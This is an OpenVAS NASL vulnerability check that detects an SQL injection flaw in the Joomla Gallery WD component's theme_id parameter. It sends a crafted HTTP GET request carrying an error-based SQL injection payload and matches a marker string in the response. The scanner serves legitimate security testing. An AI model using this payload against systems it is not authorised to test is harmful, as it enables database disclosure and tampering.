###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_gallery_wd_sql_vuln.nasl 11323 2018-09-11 10:20:18Z ckuersteiner $
#
# Joomla Gallery WD Component Multiple Parameter SQL Injection Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805447");
  script_version("$Revision: 11323 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-11 12:20:18 +0200 (Tue, 11 Sep 2018) $");
  script_tag(name:"creation_date", value:"2015-04-09 11:27:25 +0530 (Thu, 09 Apr 2015)");
  script_tag(name:"qod_type", value:"remote_vul");

  script_name("Joomla Gallery WD Component Multiple Parameter SQL Injection Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Joomla Gallery WD component and is prone to sql
injection vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and check whether it is able to execute
sql query or not.");

  script_tag(name:"insight", value:"Flaw is due to joomla component Gallery WD is not filtering data in 'theme_id'
and 'image_id' parameters.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to inject or manipulate
SQL queries in the back-end database, allowing for the manipulation or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"Joomla Gallery WD component.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade
to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36560");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/131186");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:http_port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php?option=com_gallery_wd&view=gallerybox&image_id=19"+
            "&gallery_id=2&theme_id=1%20AND%20(SELECT%206173%20FROM(SELECT%"+
            "20COUNT(*),CONCAT(0x716b627871,SQL-INJECTION-TEST(MID((IFNULL("+
            "CAST(database()%20AS%20CHAR),0x20)),1,50)),0x716a6a7171,FLOOR(RAND"+
            "(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)&lang=fr";

if(http_vuln_check(port:http_port, url:url, pattern:"SQL-INJECTION-TEST",
                   extra_check:"You have an error in your SQL syntax")) {
  report = report_vuln_url( port:http_port, url:url );
  security_message(port: http_port, data: report);
  exit(0);
}

exit(99);
